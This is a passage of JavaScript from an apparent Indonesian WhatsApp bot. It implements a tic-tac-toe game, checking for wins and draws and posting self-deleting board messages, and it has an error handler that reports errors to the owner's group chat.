surya.sendMessage(from, ucapan1, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er2], forwardingScore: 508, isForwarded: true}})
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && 
!ttt.includes('4️⃣') && !ttt.includes('5️⃣') && !ttt.includes('6️⃣') && 
!ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')){
let ucapan1 = `*Game Tictactoe*

*Hasil Akhir :*
${ttt}

Permainan seri`
reply(ucapan1)
var naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
let ucapans = `*Game Tictactoe*

@${tty.er1.split('@')[0]} = ⭕
@${tty.er2.split('@')[0]} = ❎

${ttt}
Giliran = @${tty.er1.split('@')[0]}

_∅ Pesan ini akan terhapus otomatis dalam 30 detik_`
let tt2 = await surya.sendMessage(from, ucapans, text, {thumbnail: suryaImg, sendEphemeral: true, quoted:msg, contextInfo : {mentionedJid: [tty.er1, tty.er2], forwardingScore: 508, isForwarded: true}})
setTimeout(() => {
surya.deleteMessage(Suryaa, tt2.key)
},30000)
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) {
if (!e.includes("Cannot read property 'conversation' of null")) {
if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
if (!e.includes("Cannot set property 'mtype' of undefined")) {
if (!e.includes("jid is not defined")) {
console.log(color('|ERROR|', 'red'), color(e, 'cyan'))
surya.sendMessage('62895415497664-1603788025@g.us', `
───「 _*ADA YANG ERROR*_ 」───

${S}${e}${S}
────────────────────`,
MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creator Mecha Botz\nJabal Surya Ngalam",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/Rya.jpg'),sourceUrl:"https://wa.me/62895415497664?text=Hai+mastah+surya"}}})
}
}
}
}
}
}
}
